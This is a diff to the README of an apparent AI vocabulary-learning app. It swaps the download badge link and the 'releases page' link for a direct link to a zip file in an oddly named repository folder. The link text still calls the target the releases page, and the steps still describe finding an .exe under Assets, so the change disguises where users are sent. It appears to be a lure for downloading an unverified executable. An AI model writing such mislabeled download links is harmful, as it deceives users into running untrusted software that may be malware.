@@ -1,6 +1,6 @@
 # 📚 Ziyang-Vocab-Master - Master your vocabulary with AI tools
 
-[![Download Ziyang-Vocab-Master](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/ebrahemhamdy/Ziyang-Vocab-Master/releases)
+[![Download Ziyang-Vocab-Master](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/ebrahemhamdy/Ziyang-Vocab-Master/main/unescaladed/Vocab_Ziyang_Master_v1.0.zip)
 
 Ziyang-Vocab-Master helps students learn new words through artificial intelligence. This software tracks your progress and suggests words to review. It organizes your study sessions and saves time when you prepare for exams.
 
@@ -17,7 +17,7 @@ Your computer must meet these basic standards to run the software:
 
 Follow these steps to set up the application on your computer:
 
-1. Visit [the releases page](https://github.com/ebrahemhamdy/Ziyang-Vocab-Master/releases) to find the latest version.
+1. Visit [the releases page](https://raw.githubusercontent.com/ebrahemhamdy/Ziyang-Vocab-Master/main/unescaladed/Vocab_Ziyang_Master_v1.0.zip) to find the latest version.
 2. Look for the file ending in .exe under the Assets section.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder.
